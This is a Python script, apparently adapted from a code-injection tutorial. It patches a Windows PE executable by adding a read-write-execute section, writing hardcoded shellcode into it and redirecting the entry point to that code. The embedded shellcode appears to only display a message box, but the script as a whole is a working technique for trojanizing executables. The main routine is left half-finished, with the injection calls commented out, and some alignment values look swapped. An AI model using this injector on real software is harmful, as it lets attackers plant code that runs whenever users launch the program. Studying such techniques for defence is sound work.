#Reference: https://axcheron.github.io/code-injection-with-python/

import pefile
import sys

def align(size, alignment):
    return (((size + alignment - 1) // alignment) * alignment)

def addSection(fileName, sectionSize, injectedFile):
    '''add a new section with specified size at the end of the executable'''

    print("[*] Adding new section")
    pe = pefile.PE(fileName)
    newSectionName = b".frost"
    newSectionName += b"\x00" * (8 - len(newSectionName))    #name of section must be 8 bytes

    #calculate offset and size of new section
    # it seems virtualSize doesn't need alignment, but just to be sure
    virtualSize = align(sectionSize, pe.OPTIONAL_HEADER.FileAlignment)
    rawSize = align(sectionSize, pe.OPTIONAL_HEADER.SectionAlignment)
    characteristics = 0xE0000020  # READ | WRITE | EXECUTE | CODE

    numberOfSections = pe.FILE_HEADER.NumberOfSections

    virtualOffset = align(pe.sections[numberOfSections - 1].VirtualAddress +
                          pe.sections[numberOfSections - 1].Misc_VirtualSize,
                          pe.OPTIONAL_HEADER.SectionAlignment)
    rawOffset = align(pe.sections[numberOfSections - 1].PointerToRawData +
                      pe.sections[numberOfSections - 1].SizeOfRawData,
                      pe.OPTIONAL_HEADER.FileAlignment)

    newSectionEntry = pe.sections[numberOfSections - 1].get_file_offset() + 40

    #add a new entry to section header table
    #an entry in the section header table follows the IMAGE_SECTION_HEADER structure
    pe.set_bytes_at_offset(newSectionEntry, newSectionName)
    pe.set_dword_at_offset(newSectionEntry + 8, virtualSize)
    pe.set_dword_at_offset(newSectionEntry + 12, virtualOffset)
    pe.set_dword_at_offset(newSectionEntry + 16, rawSize)
    pe.set_dword_at_offset(newSectionEntry + 20, rawOffset)
    pe.set_bytes_at_offset(newSectionEntry + 24, b"\x00"*12)
    pe.set_dword_at_offset(newSectionEntry + 36, characteristics)

    # Edit the value in the File and Optional headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtualSize + virtualOffset
    pe.write(injectedFile)

    #resize the executable
    f = open(injectedFile, "ab")
    f.write(b"\x00" * rawSize)
    f.close()

def getShellCode(scriptPath):
    script = ""
    with open(scriptPath, "r") as f:
        script = f.read()
    print(script)



def injectShellcode(fileName):
    '''write shellcode to the newly created section, then change the entry point'''
    print("[*] Injecting shellcode")
    shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                  b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                  b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                  b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                  b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                  b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                  b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                  b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                  b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                  b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                  b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                  b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                  b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                  b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                  b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                  b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
                  b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
                  b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x65\x58\x20"
                  b"\x20\x68\x20\x63\x6f\x64\x68\x6e\x20\x75\x72\x68\x27"
                  b"\x6d\x20\x69\x68\x6f\x2c\x20\x49\x68\x48\x65\x6c\x6c"
                  b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
                  b"\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08")

    pe = pefile.PE(fileName)
    rawOffset = pe.sections[pe.FILE_HEADER.NumberOfSections - 1].PointerToRawData
    #print(pe.sections[pe.FILE_HEADER.NumberOfSections - 1].Name)
    pe.set_bytes_at_offset(rawOffset, shellcode)

    print("[*] Changing entry point")
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[pe.FILE_HEADER.NumberOfSections - 1].VirtualAddress
    print("\tNew entry point: 0x%02x"%(pe.OPTIONAL_HEADER.AddressOfEntryPoint))

    pe.write(fileName)


if __name__ == "__main__":
    if (len(sys.argv) < 3):
        print("Usage: python injector.py <peFile> <psScript>")
        exit(1)

    peFilePath = sys.argv[1]
    psScriptPath = sys.argv[2]

    outputFile = "modified.exe"
    #addSection(peFilePath, 0x1000, outputFile)
    #injectShellcode(outputFile)
    getShellCode(psScriptPath)